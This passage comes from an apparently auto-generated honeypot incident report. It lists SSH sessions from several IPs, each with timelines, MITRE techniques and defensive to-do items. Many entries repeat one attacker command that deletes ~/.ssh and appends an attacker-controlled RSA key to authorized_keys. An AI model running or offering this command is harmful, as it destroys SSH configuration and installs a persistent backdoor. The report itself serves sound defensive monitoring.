| `2026-04-17 03:28:34` | `cowrie.command.failed` |
| `2026-04-17 03:28:35` | `cowrie.log.closed` |
| `2026-04-17 03:28:35` | `cowrie.session.params` |
| `2026-04-17 03:28:35` | `cowrie.command.input` |
| `2026-04-17 03:28:35` | `cowrie.session.file_download` |
| `2026-04-17 03:28:35` | `cowrie.log.closed` |
| `2026-04-17 03:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e5751c4d714

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:28 |
| **Last Seen** | 2026-04-17 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:28:38` | `cowrie.session.connect` |
| `2026-04-17 03:28:39` | `cowrie.client.version` |
| `2026-04-17 03:28:39` | `cowrie.client.kex` |
| `2026-04-17 03:28:40` | `cowrie.login.success` |
| `2026-04-17 03:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8e2bfaba468

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:28 |
| **Last Seen** | 2026-04-17 03:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:28:48` | `cowrie.session.connect` |
| `2026-04-17 03:28:48` | `cowrie.client.version` |
| `2026-04-17 03:28:49` | `cowrie.client.kex` |
| `2026-04-17 03:28:49` | `cowrie.login.success` |
| `2026-04-17 03:28:50` | `cowrie.session.params` |
| `2026-04-17 03:28:50` | `cowrie.command.input` |
| `2026-04-17 03:28:50` | `cowrie.command.failed` |
| `2026-04-17 03:28:50` | `cowrie.log.closed` |
| `2026-04-17 03:28:50` | `cowrie.session.params` |
| `2026-04-17 03:28:50` | `cowrie.command.input` |
| `2026-04-17 03:28:50` | `cowrie.session.file_download` |
| `2026-04-17 03:28:50` | `cowrie.log.closed` |
| `2026-04-17 03:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f001836ad939

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:28 |
| **Last Seen** | 2026-04-17 03:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:28:52` | `cowrie.session.connect` |
| `2026-04-17 03:28:52` | `cowrie.client.version` |
| `2026-04-17 03:28:53` | `cowrie.client.kex` |
| `2026-04-17 03:28:53` | `cowrie.login.success` |
| `2026-04-17 03:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd57148823bd

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:32 |
| **Last Seen** | 2026-04-17 03:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:32:07` | `cowrie.session.connect` |
| `2026-04-17 03:32:08` | `cowrie.client.version` |
| `2026-04-17 03:32:08` | `cowrie.client.kex` |
| `2026-04-17 03:32:09` | `cowrie.login.success` |
| `2026-04-17 03:32:09` | `cowrie.session.params` |
| `2026-04-17 03:32:09` | `cowrie.command.input` |
| `2026-04-17 03:32:09` | `cowrie.command.failed` |
| `2026-04-17 03:32:10` | `cowrie.log.closed` |
| `2026-04-17 03:32:10` | `cowrie.session.params` |
| `2026-04-17 03:32:10` | `cowrie.command.input` |
| `2026-04-17 03:32:11` | `cowrie.session.file_download` |
| `2026-04-17 03:32:11` | `cowrie.log.closed` |
| `2026-04-17 03:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a48aae6cacb

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:32 |
| **Last Seen** | 2026-04-17 03:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:32:15` | `cowrie.session.connect` |
| `2026-04-17 03:32:15` | `cowrie.client.version` |
| `2026-04-17 03:32:15` | `cowrie.client.kex` |
| `2026-04-17 03:32:16` | `cowrie.login.success` |
| `2026-04-17 03:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d544176b9ba

| Field | Detail |
|---|---|
| **Source IP** | `4.186.31[.]101` |
| **First Seen** | 2026-04-17 03:32 |
| **Last Seen** | 2026-04-17 03:33 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:32:15` | `cowrie.session.connect` |
| `2026-04-17 03:32:16` | `cowrie.client.version` |
| `2026-04-17 03:32:16` | `cowrie.client.kex` |
| `2026-04-17 03:32:20` | `cowrie.login.success` |
| `2026-04-17 03:32:25` | `cowrie.session.params` |
| `2026-04-17 03:32:25` | `cowrie.command.input` |
| `2026-04-17 03:32:25` | `cowrie.command.failed` |
| `2026-04-17 03:32:25` | `cowrie.log.closed` |
| `2026-04-17 03:32:27` | `cowrie.session.params` |
| `2026-04-17 03:32:27` | `cowrie.command.input` |
| `2026-04-17 03:32:28` | `cowrie.session.file_download` |
| `2026-04-17 03:32:28` | `cowrie.log.closed` |
| `2026-04-17 03:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.186.31[.]101` to AbuseIPDB if not already reported
- [ ] Block `4.186.31[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6b38f8374d3

| Field | Detail |
|---|---|
| **Source IP** | `4.186.31[.]101` |
| **First Seen** | 2026-04-17 03:32 |
| **Last Seen** | 2026-04-17 03:33 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:32:47` | `cowrie.session.connect` |
| `2026-04-17 03:32:47` | `cowrie.client.version` |
| `2026-04-17 03:32:47` | `cowrie.client.kex` |
| `2026-04-17 03:33:04` | `cowrie.login.success` |
| `2026-04-17 03:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.186.31[.]101` to AbuseIPDB if not already reported
- [ ] Block `4.186.31[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31cb57831aa1

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:32 |
| **Last Seen** | 2026-04-17 03:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:32:56` | `cowrie.session.connect` |
| `2026-04-17 03:32:56` | `cowrie.client.version` |
| `2026-04-17 03:32:56` | `cowrie.client.kex` |
| `2026-04-17 03:32:57` | `cowrie.login.success` |
| `2026-04-17 03:32:57` | `cowrie.session.params` |
| `2026-04-17 03:32:57` | `cowrie.command.input` |
| `2026-04-17 03:32:57` | `cowrie.command.failed` |
| `2026-04-17 03:32:57` | `cowrie.log.closed` |
| `2026-04-17 03:32:57` | `cowrie.session.params` |
| `2026-04-17 03:32:57` | `cowrie.command.input` |
| `2026-04-17 03:32:57` | `cowrie.session.file_download` |
| `2026-04-17 03:32:57` | `cowrie.log.closed` |
| `2026-04-17 03:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8833d53e9aef

| Field | Detail |
|---|---|
| **Source IP** | `45.93.28[.]216` |
| **First Seen** | 2026-04-17 03:32 |
| **Last Seen** | 2026-04-17 03:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:32:56` | `cowrie.session.connect` |
| `2026-04-17 03:32:57` | `cowrie.client.version` |
| `2026-04-17 03:32:57` | `cowrie.client.kex` |
| `2026-04-17 03:32:58` | `cowrie.login.success` |
| `2026-04-17 03:32:58` | `cowrie.session.params` |
| `2026-04-17 03:32:58` | `cowrie.command.input` |
| `2026-04-17 03:32:58` | `cowrie.command.failed` |
| `2026-04-17 03:32:59` | `cowrie.log.closed` |
| `2026-04-17 03:33:01` | `cowrie.session.params` |
| `2026-04-17 03:33:01` | `cowrie.command.input` |
| `2026-04-17 03:33:01` | `cowrie.session.file_download` |
| `2026-04-17 03:33:01` | `cowrie.log.closed` |
| `2026-04-17 03:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.93.28[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.93.28[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be3bb9288b1d

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:33 |
| **Last Seen** | 2026-04-17 03:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:33:00` | `cowrie.session.connect` |
| `2026-04-17 03:33:00` | `cowrie.client.version` |
| `2026-04-17 03:33:00` | `cowrie.client.kex` |
| `2026-04-17 03:33:00` | `cowrie.login.success` |
| `2026-04-17 03:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bfc1cf3b0c8

| Field | Detail |
|---|---|
| **Source IP** | `45.93.28[.]216` |
| **First Seen** | 2026-04-17 03:33 |
| **Last Seen** | 2026-04-17 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:33:06` | `cowrie.session.connect` |
| `2026-04-17 03:33:06` | `cowrie.client.version` |
| `2026-04-17 03:33:06` | `cowrie.client.kex` |
| `2026-04-17 03:33:07` | `cowrie.login.success` |
| `2026-04-17 03:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.93.28[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.93.28[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac9db789bc3a

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:33 |
| **Last Seen** | 2026-04-17 03:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:33:51` | `cowrie.session.connect` |
| `2026-04-17 03:33:51` | `cowrie.client.version` |
| `2026-04-17 03:33:52` | `cowrie.client.kex` |
| `2026-04-17 03:33:53` | `cowrie.login.success` |
| `2026-04-17 03:33:53` | `cowrie.session.params` |
| `2026-04-17 03:33:53` | `cowrie.command.input` |
| `2026-04-17 03:33:53` | `cowrie.command.failed` |
| `2026-04-17 03:33:53` | `cowrie.log.closed` |
| `2026-04-17 03:33:54` | `cowrie.session.params` |
| `2026-04-17 03:33:54` | `cowrie.command.input` |
| `2026-04-17 03:33:54` | `cowrie.session.file_download` |
| `2026-04-17 03:33:54` | `cowrie.log.closed` |
| `2026-04-17 03:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92bd9451d180

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:33 |
| **Last Seen** | 2026-04-17 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:33:57` | `cowrie.session.connect` |
| `2026-04-17 03:33:58` | `cowrie.client.version` |
| `2026-04-17 03:33:58` | `cowrie.client.kex` |
| `2026-04-17 03:33:59` | `cowrie.login.success` |
| `2026-04-17 03:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc994869c1c4

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:34 |
| **Last Seen** | 2026-04-17 03:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:34:57` | `cowrie.session.connect` |
| `2026-04-17 03:34:57` | `cowrie.client.version` |
| `2026-04-17 03:34:57` | `cowrie.client.kex` |
| `2026-04-17 03:34:57` | `cowrie.login.success` |
| `2026-04-17 03:34:57` | `cowrie.session.params` |
| `2026-04-17 03:34:57` | `cowrie.command.input` |
| `2026-04-17 03:34:57` | `cowrie.command.failed` |
| `2026-04-17 03:34:58` | `cowrie.log.closed` |
| `2026-04-17 03:34:58` | `cowrie.session.params` |
| `2026-04-17 03:34:58` | `cowrie.command.input` |
| `2026-04-17 03:34:58` | `cowrie.session.file_download` |
| `2026-04-17 03:34:58` | `cowrie.log.closed` |
| `2026-04-17 03:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e7932ae46d6

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:35 |
| **Last Seen** | 2026-04-17 03:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:35:00` | `cowrie.session.connect` |
| `2026-04-17 03:35:00` | `cowrie.client.version` |
| `2026-04-17 03:35:00` | `cowrie.client.kex` |
| `2026-04-17 03:35:00` | `cowrie.login.success` |
| `2026-04-17 03:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82d94538645a

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:36 |
| **Last Seen** | 2026-04-17 03:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:36:31` | `cowrie.session.connect` |
| `2026-04-17 03:36:31` | `cowrie.client.version` |
| `2026-04-17 03:36:31` | `cowrie.client.kex` |
| `2026-04-17 03:36:32` | `cowrie.login.success` |
| `2026-04-17 03:36:32` | `cowrie.session.params` |
| `2026-04-17 03:36:32` | `cowrie.command.input` |
| `2026-04-17 03:36:32` | `cowrie.command.failed` |
| `2026-04-17 03:36:32` | `cowrie.log.closed` |
| `2026-04-17 03:36:32` | `cowrie.session.params` |
| `2026-04-17 03:36:32` | `cowrie.command.input` |
| `2026-04-17 03:36:32` | `cowrie.session.file_download` |
| `2026-04-17 03:36:32` | `cowrie.log.closed` |
| `2026-04-17 03:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-569b1a1dd4de

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:36 |
| **Last Seen** | 2026-04-17 03:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:36:34` | `cowrie.session.connect` |
| `2026-04-17 03:36:34` | `cowrie.client.version` |
| `2026-04-17 03:36:34` | `cowrie.client.kex` |
| `2026-04-17 03:36:34` | `cowrie.login.success` |
| `2026-04-17 03:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e04365b90f0b

